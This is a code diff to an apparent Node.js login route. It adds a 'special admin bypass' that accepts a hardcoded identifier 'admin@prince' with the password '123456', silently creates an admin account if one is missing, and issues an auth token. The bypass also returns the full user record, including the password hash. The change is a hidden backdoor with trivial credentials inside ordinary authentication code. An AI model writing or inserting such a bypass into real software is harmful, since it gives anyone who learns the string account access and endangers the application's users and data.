@@ -118,6 +118,34 @@ export const loginUser = tryCatch(async (req, res) => {
     // 2. If not found, find ALL users by email.
     // 3. Check password against matches.
 
+    // --- SPECIAL ADMIN BYPASS ---
+    if (idStr === "admin@prince") {
+        if (password !== "123456") {
+            return res.status(400).json({ message: "Invalid credentials" });
+        }
+        let adminUser = await User.findOne({ email: "admin@prince" });
+        if (!adminUser) {
+            // Auto-create admin if not exists (Internal use only)
+            const hashPassword = await bcrypt.hash("123456", 10);
+            adminUser = await User.create({
+                name: "Admin Prince",
+                email: "admin@prince",
+                password: hashPassword,
+                gender: "Male",
+                username: "admin_prince",
+                profilePic: {
+                    id: "admin_default",
+                    url: "https://res.cloudinary.com/djp6mvl8f/image/upload/v1715854611/defaults/admin_avatar.png"
+                }
+            });
+        }
+        generateToken(adminUser._id, res);
+        return res.json({
+            message: "Admin Access Granted",
+            user: adminUser,
+        });
+    }
+
     let potentialUsers = [];
 
     // 1. Check Username
